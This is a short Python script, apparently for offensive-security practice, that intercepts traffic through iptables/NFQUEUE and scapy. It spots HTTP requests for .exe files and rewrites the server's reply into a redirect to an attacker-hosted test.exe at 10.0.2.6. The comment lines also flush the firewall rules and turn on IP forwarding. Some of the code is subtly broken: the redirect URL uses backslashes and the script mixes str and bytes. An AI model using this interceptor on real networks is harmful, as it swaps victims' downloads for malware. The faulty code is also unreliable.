#!/usr/bin/env python3
# iptables --flush
# iptables -I INPUT -j NFQUEUE --queue-num 0
# iptables -I OUTPUT -j NFQUEUE --queue-num 0
# iptables -I FORWARD -j NFQUEUE --queue-num 0
# echo 1 > /proc/sys/net/ipv4/ip_forward

import netfilterqueue
import scapy.all as scapy

ack_list = []

def set_load(packet, load):

	packet[scapy.Raw].load = load

	del packet[scapy.IP].len
	del packet[scapy.IP].chksum
	del packet[scapy.TCP].chksum

	return packet


def process_packet(packet):

	s_packet = scapy.IP(packet.get_payload())

	if (s_packet.haslayer(scapy.Raw) and s_packet[scapy.TCP].dport == 80):
		print('[+] HTTP Request detected')
		print(s_packet.show())

		if ('.exe' in s_packet[scapy.Raw].load):
			print('[+] EXE file Request detected!')
			ack_list.append(s_packet[scapy.TCP].ack)
			print(s_packet.show())

	elif (s_packet.haslayer(scapy.Raw) and s_packet[scapy.TCP].sport == 80):

		if (s_packet[scapy.TCP].seq in ack_list):
			ack_list.remove(s_packet[scapy.TCP].seq)
			print('[+] Serving custom file..')
			
			packet.set_payload(bytes(set_load(s_packet, 'HTTP/1.1 301 Moved Permanently\nLocation: http:\\10.0.2.6\\test.exe\n\n')))

	packet.accept()


if __name__ == "__main__":
	# Verify if iptables rules are set/active
	print('[+] Interception in ON..')
	queue = netfilterqueue.NetfilterQueue()
	queue.bind(0, process_packet)
	queue.run()
	
